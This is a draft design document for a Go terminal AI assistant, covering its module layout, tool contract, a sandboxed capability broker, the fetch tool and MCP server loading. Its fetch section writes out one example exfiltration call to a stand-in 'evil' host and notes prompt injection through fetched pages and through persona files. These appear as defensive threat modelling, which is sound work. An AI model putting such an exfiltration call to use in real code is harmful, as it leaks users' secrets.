# `assistance` — Design Document

**Status:** Draft v0.2 · **Owner:** TBD · **Last updated:** 2026-08-26
**Changes in v0.2:** D-01 (single Go module, feature packages) · D-02 (MCP as generic
loader) · D-03 (pruning committed to M3) · D-04 + §5.6.1 (`fetch` vs `exec curl`) ·
§8 rewritten · C1/C3/C5 resolved · R-16, R-17 added
**Reviewers:** TBD · **Supersedes:** — · **Related:** RFC-000 (this doc)

---

## 0. How to read and edit this document

This section is normative for contributors. It exists so that a document edited by
six people over a year still reads like it was written by one.

### 0.1 Requirement language

| Keyword | Meaning |
|---|---|
| **MUST** | Non-negotiable. A build violating this is broken, not merely suboptimal. |
| **SHOULD** | Strong default. Deviations require a written rationale in the module's `DECISIONS.md`. |
| **MAY** | Genuinely optional. |
| **WILL NOT** | Explicitly out of scope for v1. Re-opening requires an RFC. |

### 0.2 Section conventions

- Every module in §5 uses the **identical eight-heading template**. Do not add,
  remove, or reorder headings. If a heading is not applicable, write `N/A` and one
  sentence explaining why.
- Every open question is tagged `[OQ-nn]` and MUST also appear in §12.
- Every identified risk is tagged `[R-nn]` and MUST also appear in §11.
- Interfaces are given as Go source. Go source in this document is **normative** —
  it is the contract, not an illustration. Prose that contradicts an interface
  block loses.
- Diagrams are ASCII. No binary assets in the repo docs tree. Rationale: reviewable
  in `git diff`, renders in every terminal, no toolchain.

### 0.3 Naming conventions

| Thing | Convention | Example |
|---|---|---|
| Go module | `github.com/<org>/assistance/<module>` | `.../assistance/mcp` |
| Package name | single lowercase word, no underscores | `package mcp` |
| Binary | `asst` | `asst chat` |
| Interface | noun or `-er`, never `I`-prefixed | `Provider`, `ToolRunner` |
| Implementation | `<backend><Interface>` | `openaiProvider`, `whisperCapturer` |
| Config key | `snake_case` in TOML, `SNAKE_CASE` in env | `voice.output.provider` |
| Env var | `ASST_` prefix, `__` for nesting | `ASST_VOICE__OUTPUT__PROVIDER` |
| Error | `Err`-prefixed sentinel or `<Name>Error` struct | `ErrDenied`, `PolicyError` |
| Event type | `<subject>.<past-tense-verb>` | `tool.invoked`, `turn.completed` |
| Feature flag | `exp_<name>` | `exp_swarm` |

### 0.4 Terminology (single source of truth)

- **Turn** — one user input → one final assistant answer. May contain many steps.
- **Step** — one provider call plus the tool invocations it requested.
- **Tool** — anything the model can invoke. Includes core tools, MCP tools, skill
  entry points, and subagents. There is exactly one `Tool` interface (§4.3).
- **Capability** — a permission grant (e.g. `fs.write:/home/u/proj/**`). Held by a
  session, checked by the broker, never held by the model.
- **Broker** — the process that actually performs privileged effects. See §6.1.
- **Skill** — a `SKILL.md` + sibling files, loaded from disk, exposed as
  progressively-disclosed instructions and optionally as tools.
- **Provider** — a remote or local inference endpoint.
- **Brain** — the agent loop implementation. Distinct from the provider.
- **Module** — in this document, a *feature package*: one directory, one Go package,
  one owner, one clear seam. It is **not** a separate `go.mod`. The repository is a
  single Go module (§8, D-01). "Module" and "package" are used interchangeably here;
  "Go module" always means the `go.mod` sense and is spelled out in full.

### 0.5 Decisions already taken

Recorded here because they close questions a reader would otherwise reopen. Each has
a `D-nn` tag; reversing one requires an RFC.

| ID | Decision | Rationale | Supersedes |
|---|---|---|---|
| **D-01** | **One Go module for the repository.** Modularity is achieved by feature packages with enforced import boundaries (§4.2), not by `go.mod` splitting. | Sixteen `go.mod` files means sixteen version bumps per `core` change and diamond-dependency risk, for zero gain in separation. Extraction later is mechanical. | OQ-21, C1 |
| **D-02** | **MCP support is a generic loader, not per-server integrations.** We write the MCP client once; any server in the public ecosystem is a config entry. There is never a `assistance-mcp-github` package. | This is the point of adopting MCP at all. Per-server Go code would make the ecosystem a maintenance burden instead of a multiplier. | C3 |
| **D-03** | **Tool pruning ships in M3, with MCP, not later.** | 12 servers ≈ 300 tools ≈ 40k tokens of schema. Without pruning the app is unusable on a 32k local model the day MCP lands. | C5 |
| **D-04** | **`fetch` is a first-class brokered tool, not `exec curl`.** | See §5.6.1. | — |

---

## 1. Summary

`assistance` is a terminal-native personal AI assistant, written in Go with
Bubble Tea, that talks and listens, runs on any model provider including local
ones, uses the existing MCP and `SKILL.md` ecosystems for its capabilities, and —
unlike current agentic CLIs — enforces its safety boundaries in code below the
model rather than by asking the model nicely.

**Why it helps:** the useful agentic CLIs today are either (a) locked to one vendor's
model, (b) unsafe by default in a way that makes people run them in throwaway VMs,
or (c) mute. `assistance` is the one you can point at a local Llama, hand a scoped
capability set, and talk to while doing something else.

---

## 2. Goals and non-goals

### 2.1 Goals

| ID | Goal | How we know we hit it |
|---|---|---|
| G1 | Every subsystem is swappable at config time without recompiling. | Swap provider, TTS, STT, and policy backend by editing TOML only. |
| G2 | Deny-by-default enforcement below the model. | Red-team suite (§9.4): 0 successful escapes out of N adversarial prompts. |
| G3 | First-class use of the existing MCP + skills ecosystem. | Install any of the top 25 public MCP servers with one command. |
| G4 | Sub-second perceived voice latency. | First audible syllable ≤ 900 ms p50 from end-of-user-speech. |
| G5 | The user is in the loop by construction, not by prompt. | Agent can block on `AskUser` as a typed, resumable state. |
| G6 | Measurable quality. | Eval suite runs in CI; regressions block merge. |
| G7 | Readable, boring, multi-developer Go. | New contributor ships a working tool in < 1 day using only §5. |

### 2.2 Non-goals for v1

- **WILL NOT** ship a GUI, web UI, or daemon-with-browser-client.
- **WILL NOT** support Windows natively (WSL2 only). `[OQ-01]`
- **WILL NOT** implement its own inference engine, VAD model, or vocoder.
- **WILL NOT** provide multi-user or multi-tenant operation. Single human, single
  machine, possibly many sessions.
- **WILL NOT** attempt hardware-level sandboxing (hypervisor/VM). We do OS-level.

---

## 3. Feature overview

1. **Radically modular core.** The CLI itself is a module. So is the agent loop, the
   provider client, the tool registry, and the security broker. Nothing is "the app";
   the app is a composition root that wires modules together (§4.2).
2. **Core tools.** `read`, `write`, `edit`, `grep`, `glob`, `exec`, `fetch`. Small,
   auditable, no cleverness. `fetch` covers web access; there is no separate
   web-search module — search is an MCP server or a `fetch` against an API (§5.7).
3. **`assistance-ai` — provider transport.** OpenAI-compatible chat completions with
   streaming, tool-calling, and multimodal parts. Anything speaking that dialect
   works: OpenAI, Anthropic-via-proxy, Groq, Ollama, llama.cpp server, vLLM, LM Studio.
4. **`assistance-brain` — the agent loop.** Decides, plans, calls tools, compacts
   context, handles interrupts and human handoff. Provider-agnostic; the brain never
   imports an HTTP client.
5. **`assistance-cli` — Bubble Tea TUI.** Status, streaming chat, tool cards, palette,
   modals, voice indicator.
6. **`assistance-skills`.** Loads `SKILL.md` directories, progressive disclosure,
   frontmatter-driven triggering.
7. **`assistance-tools`.** The single registry and `Tool` contract that core tools,
   MCP tools, skills, and subagents all satisfy.
8. **`assistance-mcp`.** Discovery, installation (`npx`/`uvx`/binary), lifecycle, and
   supervision of stdio and HTTP MCP servers. The primary capability multiplier.
9. **`assistance-voice-in`.** Wake/PTT → VAD → whisper.cpp locally or a hosted STT.
10. **`assistance-voice-out`.** Selective speech: the model marks what to say; we speak
    only that, never the whole transcript (§5.11).
11. **`assistance-security`.** Capability tokens, a policy engine, and a broker process
    that owns every privileged effect. If `fs.write` is not granted, the write syscall
    never happens — regardless of what the model emitted.
12. **`assistance-eval`.** Traces, cassettes, deterministic replay, scenario suites,
    guardrail red-teaming, and scorecards.
13. **`assistance-swarm`.** Subagents as tools, with strictly narrowing capabilities.
14. **`assistance-session`.** Persistence, resume, branch, export. *(Added — see
    §11 critique C7.)*

---

## 4. Architecture

### 4.1 Layer diagram

```
                        ┌────────────────────────────────────────┐
 L5  Composition        │  cmd/asst  (wiring, DI, flags only)    │
                        └───────────────────┬────────────────────┘
                                            │
        ┌───────────────────┬───────────────┼───────────────┬──────────────────┐
        │                   │               │               │                  │
 L4  ┌──▼───────┐   ┌───────▼──────┐  ┌─────▼─────┐  ┌──────▼──────┐  ┌────────▼───────┐
 UX  │   cli    │   │  voice-in    │  │ voice-out │  │    eval     │  │    session     │
     │(bubbletea)│  │  (STT)       │  │  (TTS)    │  │             │  │  (persistence) │
     └──┬───────┘   └───────┬──────┘  └─────┬─────┘  └──────┬──────┘  └────────┬───────┘
        │                   │               │               │                  │
        └───────────────────┴───────────────┼───────────────┴──────────────────┘
                                            │  (all UX talks to brain via Bus)
 L3  Orchestration              ┌───────────▼───────────┐      ┌─────────────┐
                                │        brain          │◄────►│    swarm    │
                                │  (agent loop, state)  │      │ (subagents) │
                                └───┬───────────────┬───┘      └─────────────┘
                                    │               │
 L2  Capability            ┌────────▼─────┐   ┌─────▼──────┐
                           │      ai      │   │   tools    │  ← single registry
                           │ (provider)   │   │ (Registry) │
                           └──────────────┘   └─────┬──────┘
                                                    │  providers of Tool:
                                     ┌──────────────┼──────────────┬──────────┐
                                ┌────▼─────┐  ┌─────▼────┐  ┌──────▼───┐  ┌───▼────┐
                                │core-tools│  │   mcp    │  │  skills  │  │ swarm  │
                                └────┬─────┘  └─────┬────┘  └──────┬───┘  └───┬────┘
                                     │              │              │          │
 L1  Enforcement                ┌────▼──────────────▼──────────────▼──────────▼────┐
                                │            security (policy + broker)            │
                                │   ALL privileged effects funnel through here     │
                                └──────────────────────┬───────────────────────────┘
                                                       │
 L0  Foundation      ┌─────────────────────────────────▼─────────────────────────┐
                     │  core (types, ids, errors, Bus, clock)  ·  config  ·  log │
                     └───────────────────────────────────────────────────────────┘
```

### 4.2 Dependency rules (enforced in CI)

- **MUST** be acyclic. Enforced by `go vet` + a custom `make lint-deps` check that
  parses import graphs against an allowlist in `deps.yaml`.
- A module **MUST NOT** import a module at a higher layer.
- Every module **MAY** import L0 (`core`, `config`, `log`). Nothing else is universal.
- `brain` **MUST NOT** import `ai` implementations, only `core`'s `Provider` interface.
  Same for `cli` → `brain`.
- `security` **MUST NOT** import any tool module. Tools depend on security, never the
  reverse. This keeps the enforcement layer free of anything it is enforcing against.
- **Interfaces live in the consumer package**, not the implementation package. Go
  idiom, and it means `brain` compiles with zero knowledge of OpenAI.

### 4.3 The single `Tool` contract

The most important simplification in this design: **core tools, MCP tools, skill
entry points, and subagents are the same thing to the brain.**

```go
// package core

// Tool is the only way the model affects the world.
type Tool interface {
    // Name is globally unique after namespacing, e.g. "fs.read", "mcp.github.create_issue".
    Name() string
    // Schema is a JSON Schema draft-2020-12 object describing arguments.
    Schema() json.RawMessage
    // Describe returns the model-facing description. May be shortened by the
    // registry under context pressure (see Registry.Prune).
    Describe() Description
    // Requires declares the capabilities this tool needs. The broker verifies
    // the actual effect independently; this is for pre-flight UX and planning.
    Requires() []Capability
    // Invoke executes. Implementations MUST honour ctx cancellation and MUST NOT
    // perform privileged effects directly — they call the broker.
    Invoke(ctx context.Context, args json.RawMessage, io ToolIO) (Result, error)
}

// ToolIO lets a tool stream progress and — critically — ask the human something
// mid-execution without unwinding the agent loop.
type ToolIO interface {
    Progress(pct float64, msg string)
    Log(level Level, msg string, kv ...any)
    Ask(ctx context.Context, q Question) (Answer, error) // blocks; see §6.4
}

type Result struct {
    Content   []Part  // text, image, or resource parts returned to the model
    Display   string  // human-facing summary rendered in the TUI
    Speech    string  // optional; what TTS says. Empty = say nothing.
    Artifacts []Ref   // files/blobs written, for the session log
    Cost      Cost    // tokens, wall time, money if known
}
```

Consequences:
- Adding MCP is "register N more `Tool`s". The brain does not change.
- A skill that exposes a script is a `Tool`. The brain does not change.
- A subagent is a `Tool` whose `Invoke` runs a nested brain. The brain does not change.
- Policy is uniform: one place decides whether *any* tool may run.

### 4.4 Runtime topology (processes)

```
   ┌─────────────────────────────┐        ┌──────────────────────────────┐
   │  asst (TUI process)         │  UDS   │  asstd-broker (privileged-ish)│
   │  - bubbletea render loop    │◄──────►│  - holds capability tokens    │
   │  - brain goroutines         │  msgpk │  - performs fs / exec / net   │
   │  - provider HTTP client     │        │  - audit log (append-only)    │
   │  - NO direct fs/exec/net    │        │  - spawns sandboxed children  │
   └──────────┬──────────────────┘        └───────────┬──────────────────┘
              │ stdio/http                            │ fork+exec, seccomp/
   ┌──────────▼──────────┐                            │ landlock/sandbox-exec
   │ MCP server (npx …)  │  ← also sandboxed          ▼
   └─────────────────────┘                  ┌──────────────────────┐
                                            │ tool child processes │
                                            └──────────────────────┘
```

Rationale for a separate broker process: an in-process policy check is defeated by
any code-execution bug in a tool or MCP server. A separate process means the TUI
process can be fully compromised and still not hold the capability to write outside
the workspace. `[R-03]` covers the residual risk.

**Cost:** IPC on every fs op. Mitigated by batching and by a read-only fast path
(§5.12.5). Measured budget: ≤ 0.4 ms per brokered call p99 on loopback UDS.

### 4.5 The event bus

Every module emits to and reads from a typed bus in `core`. The TUI is a *subscriber*,
not a caller. This is what makes the UI truthful about state without the brain
knowing a TUI exists.

```go
type Event interface{ isEvent() }

// Representative subset. Full list in core/events.go — that file is normative.
type TurnStarted    struct{ TurnID ID; Input string; Source InputSource }
type StepStarted     struct{ TurnID, StepID ID; Model string }
type TokenStreamed   struct{ StepID ID; Delta string }
type ThoughtStreamed struct{ StepID ID; Delta string } // reasoning traces, if provider exposes them
type ToolProposed    struct{ CallID ID; Tool string; Args json.RawMessage; Needs []Capability }
type ToolApproval    struct{ CallID ID; Decision Decision; By ApprovalSource }
type ToolInvoked     struct{ CallID ID }
type ToolProgress    struct{ CallID ID; Pct float64; Msg string }
type ToolCompleted   struct{ CallID ID; Result Result; Err error }
type UserAsked       struct{ AskID ID; Q Question }   // agent needs the human
type UserAnswered    struct{ AskID ID; A Answer }
type PolicyDenied    struct{ CallID ID; Rule string; Cap Capability }
type ContextCompacted struct{ Before, After int; Strategy string }
type SpeechRequested struct{ Text string; Voice string; Priority int }
type TurnCompleted   struct{ TurnID ID; Cost Cost; Stop StopReason }
```

**Rule:** if the UI needs to display a state, an event **MUST** exist for entering
and leaving that state. No UI polling of brain internals. This directly satisfies the
"always show the user what's going on" requirement in §7.

---

## 5. Module specifications

Template — every module below uses exactly these headings:
**Purpose · Public interface · Depends on · Configuration · Swappable backends ·
Failure modes · Testing · Open questions**

---

### 5.1 `assistance-core`

**Purpose.** Types, IDs, errors, the event bus, clock, and every interface that
crosses a module boundary. Contains no logic beyond the bus.

**Public interface.**
```go
type ID string                     // ULID; sortable, timestamped
type Bus interface {
    Publish(Event)
    Subscribe(filter func(Event) bool) (<-chan Event, func())
}
type Clock interface{ Now() time.Time; After(time.Duration) <-chan time.Time }
```
Plus `Tool`, `Provider`, `Policy`, `Broker`, `Capability`, `Message`, `Part`, `Cost`.

**Depends on.** Nothing outside stdlib. **MUST** stay dependency-free — this is what
lets any module be swapped without a diamond dependency conflict.

**Configuration.** N/A.

**Swappable backends.** N/A — this *is* the seam.

**Failure modes.** A slow subscriber must not stall publishers. `Bus.Publish` is
non-blocking; per-subscriber ring buffer of 1024, drops oldest, emits
`EventsDropped{n}` so the UI can show a "trace truncated" marker. `[R-08]`

**Testing.** Bus fuzz test for ordering/drop semantics. `Clock` fake used everywhere;
`time.Now()` outside `core` is a lint error.

**Open questions.** `[OQ-02]` Do we need ordered delivery guarantees per-turn, or is
causal ordering by ULID sufficient for the UI to reconstruct?

---

### 5.2 `assistance-config`

**Purpose.** Layered configuration and the module wiring manifest.

**Public interface.**
```go
type Config struct {
    Profile  string
    Provider ProviderCfg
    Voice    VoiceCfg
    Tools    ToolsCfg
    MCP      MCPCfg
    Skills   SkillsCfg
    Security SecurityCfg
    UI       UICfg
    Eval     EvalCfg
}
func Load(paths ...string) (*Config, Diagnostics, error)
func (c *Config) Validate() Diagnostics   // warnings + errors, never panics
```

**Depends on.** `core`.

**Configuration.** Precedence, lowest to highest:
1. Compiled defaults
2. `/etc/assistance/config.toml`
3. `$XDG_CONFIG_HOME/assistance/config.toml`
4. `./.assistance/config.toml` (workspace)
5. Profile overlay (`--profile work`)
6. `ASST_*` environment
7. Command-line flags

Secrets are **never** in TOML. They are referenced:
`api_key = "keyring://openai"` or `"env://OPENAI_API_KEY"` or `"cmd://op read op://..."`.
Resolution happens in the broker, not the TUI process, so the key never enters the
address space that runs model output. `[R-09]`

**Swappable backends.** Secret resolvers: OS keyring, env, `cmd://`, file with mode
0600. Registered via a `SecretResolver` interface.

**Failure modes.** Unknown keys are a **warning** not an error (forward compat), but
unknown keys inside `security.*` are a **hard error** — a typo must never silently
widen permissions. This asymmetry is deliberate.

**Testing.** Golden-file tests for the full precedence matrix. Property test: no
config produces a security posture wider than the profile it inherits from.

**Open questions.** `[OQ-03]` Hot reload — which subtrees can reload live? Proposal:
`ui`, `voice`, and `provider` yes; `security` no (requires restart, prevents
downgrade-during-run attacks).

---

### 5.3 `assistance-ai` (provider transport)

**Purpose.** Speak the OpenAI-compatible wire protocol. Nothing else. No retries
policy decisions, no prompt construction, no tool-choice logic.

**Public interface.**
```go
type Provider interface {
    Name() string
    Capabilities() ProviderCaps  // streaming, tools, vision, audio, json_schema, reasoning
    Chat(ctx context.Context, req Request) (Stream, error)
    Embed(ctx context.Context, in []string) ([][]float32, error) // optional; ErrUnsupported
    Count(msgs []Message) (int, error)  // may be an estimate; MUST say which
}
type Stream interface {
    Next() (Chunk, error) // io.EOF terminates
    Close() error
}
type Chunk struct {
    Text      string
    Reasoning string
    ToolCall  *PartialToolCall
    Usage     *Usage
    Finish    *StopReason
}
```

**Depends on.** `core`, `config`, `log`.

**Configuration.**
```toml
[provider]
active = "local"

[provider.profiles.local]
kind      = "openai_compatible"
base_url  = "http://127.0.0.1:11434/v1"
model     = "qwen3:14b"
max_tokens = 4096

[provider.profiles.cloud]
kind      = "openai_compatible"
base_url  = "https://api.openai.com/v1"
model     = "gpt-5"
api_key   = "keyring://openai"

[provider.routing]                 # optional cost/capability routing
plan      = "cloud"                # the brain's planning calls
tools     = "cloud"
summarize = "local"                # cheap work goes local
```

**Swappable backends.** Any OpenAI-compatible endpoint. A `kind = "custom"` plugin
point exists for genuinely different APIs, implemented as an out-of-process adapter
speaking our protobuf/JSON contract rather than a Go plugin (§11 critique C2).

**Failure modes.** Normalise everything into a small error taxonomy:
`ErrRateLimit(retryAfter)`, `ErrContextLength(limit, got)`, `ErrAuth`,
`ErrUnsupported(feature)`, `ErrTransient`, `ErrProviderMalformed`. Retries with
jittered exponential backoff on `ErrTransient` and `ErrRateLimit` only. The brain
decides what to do about `ErrContextLength`; the transport never silently truncates.

**Local-model reality check:** many local servers advertise tool calling and then
emit malformed JSON or hallucinate the tool-call wrapper. The transport **MUST**
provide a `ToolCallRepair` shim: try native tool-call fields → try fenced JSON in
content → try a constrained-decoding re-ask. Emit `ProviderQuirk` events so eval can
count how often we're papering over a bad backend. `[R-05]`

**Testing.** Recorded cassettes per backend (`testdata/cassettes/*.jsonl`).
A conformance suite any new provider must pass: 22 cases covering streaming
interleave, tool-call fragmentation across chunks, mid-stream errors, and unicode
boundary splits.

**Open questions.** `[OQ-04]` Do we normalise reasoning/thinking tokens across
providers, or expose them raw and let the UI deal? Leaning: normalise to a
`Reasoning` channel, keep raw in the trace.

---

### 5.4 `assistance-brain` (agent loop)

**Purpose.** The decision engine. Owns conversation state, the step loop, tool
selection, context management, interrupts, and human handoff.

**Public interface.**
```go
type Brain interface {
    Run(ctx context.Context, in Input) error   // publishes events; returns when turn ends
    Interrupt(reason string)                   // user pressed Esc
    Answer(askID ID, a Answer)                 // human replying to Ask
    State() Snapshot                            // for persistence and the UI header
}
```

**Depends on.** `core`, `config`, `tools` (registry interface only), `session`.

**The loop.**
```
Run(input):
  1. assemble    → system prompt + persona + skills index + memory + history + input
  2. budget      → if tokens > threshold: compact (§5.4.2) and emit ContextCompacted
  3. call        → provider.Chat(stream=true); relay TokenStreamed / ThoughtStreamed
  4. dispatch    → for each requested tool call:
                     a. registry.Lookup
                     b. policy.Evaluate(cap set, args)  ── deny → synth tool error, goto 6
                     c. approval gate (auto | ask-user | never)
                     d. invoke, concurrently if all calls are declared read-only
  5. absorb      → append results as tool messages
  6. decide      → stop conditions: model emitted final text | step budget |
                                    cost budget | user interrupt | fatal policy error
                   else goto 2
  7. finalize    → emit TurnCompleted, request speech (§5.11), persist
```

**Concurrency rule.** Tool calls in a single step run in parallel **only if every one
of them declares `SideEffect: ReadOnly`**. Any write/exec forces sequential execution
in the order the model emitted them. This is unglamorous and prevents an entire class
of "two agents edited the same file" bugs.

**Configuration.**
```toml
[brain]
max_steps          = 40
max_turn_cost_usd  = 1.00
parallel_readonly  = true
compaction         = "summarize_oldest"   # | "drop_oldest" | "recursive_summary"
compact_at_pct     = 75
persona            = "personas/ada.md"
```

#### 5.4.1 Personality / persona

Persona is **data, not code**. A persona is a directory:
```
personas/ada/
  persona.md        # voice, tone, values, refusal style, verbosity
  style.toml        # ui accent colour, tts voice id, speech ratio, emoji policy
  examples.jsonl    # few-shot exchanges, optional
  bindings.toml     # tool aliases, slash command shortcuts
```
`persona.md` is injected into the system prompt after the immutable safety preamble
and **cannot** modify capability grants — a persona that says "you may write
anywhere" changes nothing, because grants live in the broker. Stated explicitly
because it is exactly the seam an attacker aims at. `[R-04]`

#### 5.4.2 Context management

Three-tier: **hot** (recent turns, verbatim) → **warm** (summarised spans) → **cold**
(session log on disk, retrievable via a `history.search` tool). Compaction is a tool
call to the *cheap* provider profile, not the expensive one. Compaction MUST preserve
verbatim: the current task statement, all unresolved `AskUser` answers, and every
active file path. `[OQ-05]` covers whether we need embeddings for cold retrieval or
whether grep is enough for v1. *(Position: grep is enough for v1; ship it.)*

**Swappable backends.** The whole `Brain` is an interface — a `ReActBrain` ships in
v1; a `PlannerExecutorBrain` and a `ReplayBrain` (for eval) are alternate
implementations. This is what makes eval-by-replay possible.

**Failure modes.** Loop detection: identical (tool, args) triple three times in a
turn → inject a "you are repeating yourself" system nudge; five times → hard stop
with `StopReason=Looping`. Budget exhaustion is a *graceful* stop that asks the user
whether to continue, never a crash.

**Testing.** The brain is tested against a `FakeProvider` driven by a script, so
loop logic is deterministic and fast. Zero network in brain unit tests.

**Open questions.** `[OQ-05]` cold retrieval strategy. `[OQ-06]` Should the brain own
a persistent "memory" (facts across sessions), or is that a skill? *(Position: a
built-in `memory` tool backed by a plain markdown file, so it is inspectable.)*

---

### 5.5 `assistance-tools` (registry)

**Purpose.** One registry. Namespacing, schema validation, description budgeting,
and the approval-mode table.

**Public interface.**
```go
type Registry interface {
    Register(source Source, t Tool) error   // Source = core|mcp|skill|swarm
    Lookup(name string) (Tool, bool)
    List(filter Filter) []Tool
    // Prune returns the tool set to expose to the model this step, given a token
    // budget and the current task. Full set may be hundreds of MCP tools.
    Prune(ctx context.Context, budget int, hint string) []Tool
}
```

**Depends on.** `core`, `security`.

**Configuration.**
```toml
[tools]
approval_default = "ask"           # auto | ask | never
max_exposed      = 60              # hard cap on tools sent to the model per step
[tools.approval]
"fs.read"        = "auto"
"fs.write"       = "ask"
"exec"           = "ask"
"mcp.github.*"   = "ask"
"mcp.*.delete_*" = "never"
```

**Swappable backends.** `Prune` strategies: `all` (if under cap), `static_groups`
(persona-defined), `retrieval` (embed tool descriptions, top-k by task). Default
`static_groups` — deterministic and debuggable. `[R-06]` notes that tool-count blowup
from MCP is a real, near-term problem: 12 MCP servers can easily mean 300 tools and
40k tokens of schema. Pruning is not a nice-to-have.

**Failure modes.** Name collision across sources → deterministic namespacing wins
(`mcp.<server>.<tool>`); a collision *within* a source is a startup error listing
both, never a silent overwrite. Schema validation of model-supplied args happens
before `Invoke` — a malformed-args error goes back to the model as a tool result, not
as a crash.

**Testing.** Contract test suite every `Tool` implementation runs (`tooltest.Run(t,
tool)`): honours cancellation within 100 ms, never panics on adversarial args, never
performs an effect when the broker denies, `Describe()` is stable.

**Open questions.** `[OQ-07]` Should `Prune` be visible to the user in the UI ("42 of
310 tools active")? *(Position: yes, and it's a palette command to inspect.)*

---

### 5.6 `assistance-core-tools`

**Purpose.** The irreducible set. Small enough to audit in an afternoon.

| Tool | Effect | Capability | Notes |
|---|---|---|---|
| `fs.read` | read | `fs.read:<glob>` | line ranges, byte cap, binary detection |
| `fs.write` | write | `fs.write:<glob>` | atomic temp+rename; refuses outside grant |
| `fs.edit` | write | `fs.write:<glob>` | exact-match string replace; fails loudly on ambiguity |
| `fs.glob` | read | `fs.read:<glob>` | |
| `grep` | read | `fs.read:<glob>` | ripgrep semantics, implemented in-process |
| `exec` | exec | `exec:<allowlist>` | sandboxed child, no shell by default |
| `fetch` | net | `net.http:<host-glob>` | GET/POST, redirect policy, size cap, HTML→md |
| `ask_user` | none | — | the human-in-the-loop primitive (§6.4) |
| `memory` | write | `fs.write:<memdir>` | markdown-backed long-term notes |

**Depends on.** `core`, `security`.

**Configuration.**
```toml
[tools.exec]
shell        = false               # true means argv goes to sh -c; requires explicit opt-in
allowlist    = ["git", "go", "rg", "ls", "cat", "npm", "python3"]
timeout      = "120s"
max_output   = "256KiB"
cwd_policy   = "workspace"         # workspace | grant | anywhere(dangerous)
```

**On `exec` and shell.** Default `shell = false`. `argv` is passed directly. This kills
the majority of injection payloads for free. `shell = true` is a documented
foot-gun that the onboarding wizard warns about and the status bar displays
permanently as `⚠ SHELL`.

**On `fetch` vs a "web search module".** Per the brief: no separate module. Search is
either an MCP server (Brave/Tavily/Exa all publish one) or `fetch` against a search
API with a key. `fetch` **MUST NOT** be treated as low-risk: it is the primary
exfiltration channel (`fetch("https://evil/?data=" + secret)`) and the primary
prompt-injection intake. Mitigations in §9.3.

#### 5.6.1 Why `fetch` is not `exec curl` (D-04)

Technically it could be. It must not be, for five reasons that are each individually
sufficient:

1. **It inverts the capability model.** `exec curl` requires granting `exec`. That
   means the `paranoid` and read-only profiles — which are supposed to allow reading
   documentation but not running anything — would have to grant process execution to
   get network access. Network and execution are different capabilities and must stay
   separately grantable. `net.http:api.github.com` is a meaningful grant;
   `exec:curl` is a blank cheque with a URL attached.
2. **The host allowlist becomes unenforceable.** Policy would have to parse a curl
   argv to find the effective destination — across `-L` redirects, `--url`,
   `--proxy`, `-K configfile`, `@file` bodies, globbing, and `--next`. That is a
   parser fighting an adversarial input, which is the losing side of that fight. With
   a real `fetch`, the broker sees the resolved IP at `Dial` time and decides there.
   Every SSRF mitigation in §9.3 — DNS-rebinding defence, RFC1918 blocking,
   per-hop redirect re-validation — is only implementable at the dial boundary.
3. **Secrets leak into argv.** `curl -H "Authorization: Bearer $TOKEN"` puts the
   token in the process table, in shell history if `shell = true`, and in any exec
   trace. Brokered `fetch` injects credentials inside the broker, into an
   `http.Request` header, and the value never exists in the TUI process (§5.12.3).
4. **No structured result.** `fetch` returns typed output: status, final URL after
   redirects, content type, a size-capped body sanitised to markdown, and an
   `untrusted: true` marker that drives the injection-escalation rule in §5.12.4.
   `exec curl` returns a blob of bytes on stdout with none of that provenance, so the
   model receives attacker-controlled HTML indistinguishable from our own text.
5. **It is not portable and not deterministic.** `curl` is absent or differs on
   minimal containers, some macOS setups, and NixOS; `--compressed`, HTTP/2 support,
   and CA bundles vary. Eval cassettes cannot record a subprocess's network the way
   they can record an `http.RoundTripper`.

Implementation follows from this: `fetch` is Go's `net/http` with a custom
`DialContext` that calls `Broker.Dial`, so the enforcement point is the socket, not a
string check. Cost is roughly 150 lines more than shelling out.

**The escape hatch stays.** A user in the `dev` or `yolo` profile with `curl` on the
`exec` allowlist can still have the model run curl, and that is fine — they granted
`exec` deliberately. What must not happen is `exec` being the *only* road to the
network, because then every network-using configuration is also an
arbitrary-execution configuration.

**Failure modes.** Every tool returns structured, model-legible errors:
`{"error":"path_outside_grant","path":"/etc/passwd","granted":["/home/u/proj/**"]}`.
Good errors let the model self-correct instead of flailing.

**Testing.** Golden tests over a fixture tree; fuzz `fs.edit` matching; property test
that no core tool can produce an effect outside its declared capability set.

**Open questions.** `[OQ-08]` Do we ship `fs.patch` (unified diff) in v1 in addition to
`fs.edit`? Models vary in which they do better with. *(Position: ship `edit` only,
measure with eval, add `patch` if the data says so.)*

---

### 5.7 `assistance-mcp`

**Purpose.** Make the public MCP ecosystem usable in one command. This is the module
that determines whether the project is interesting or not.

**Scope statement (D-02).** This module is a **generic client and supervisor**. We
implement the MCP protocol once — stdio and HTTP transports, `tools/list`,
`tools/call`, `prompts/*`, `resources/*`, lifecycle, cancellation, notifications —
and every server in the public ecosystem becomes a config entry pointing at a
repository reference. There is **no** per-server Go code, ever. `assistance-mcp-github`
is not a thing that may exist. If a specific server needs special handling, that
handling is expressed as declarative config (tool allow/deny, env, sandbox tier,
description overrides) in a **server profile** — data in `profiles/mcp/*.toml`, not
compiled code. Any proposal that adds a `switch serverName` is rejected on sight.

The unit of work when someone wants a new integration is therefore: add ~8 lines of
TOML with a pinned version and an integrity hash. Not a PR to this repository.

**Public interface.**
```go
type Manager interface {
    Install(ctx context.Context, spec Spec) (ServerID, error)
    Start(ctx context.Context, id ServerID) error
    Stop(id ServerID) error
    Health(id ServerID) Health
    Tools(id ServerID) []core.Tool      // adapted to core.Tool
    Resources(id ServerID) []Resource
    Prompts(id ServerID) []Prompt       // exposed as slash commands
}
type Spec struct {
    Ref       string   // "npm:@modelcontextprotocol/server-github" | "uvx:mcp-foo" | "http://..." | "./local"
    Args      []string
    Env       map[string]string   // secret refs, resolved by broker
    Transport Transport           // stdio | sse | streamable_http
    Pin       string              // exact version — REQUIRED, no floating tags
}
```

**Depends on.** `core`, `security`, `config`.

**Configuration.**
```toml
[[mcp.servers]]
name      = "github"
ref       = "npm:@modelcontextprotocol/server-github"
pin       = "0.6.2"
integrity = "sha512-…"            # required for npm refs
transport = "stdio"
env       = { GITHUB_TOKEN = "keyring://gh" }
sandbox   = "strict"              # strict | workspace | host(dangerous)
allow_net = ["api.github.com"]
tools     = { allow = ["*"], deny = ["delete_repository"] }
```

**Lifecycle.** Lazy start by default (server boots on first tool use, ~300 ms for
node), with `eager = true` for hot paths. Supervision: restart with backoff, 3 strikes
→ mark unhealthy, tools disappear from the registry, UI shows a red dot with the last
stderr line. Never silently retry forever.

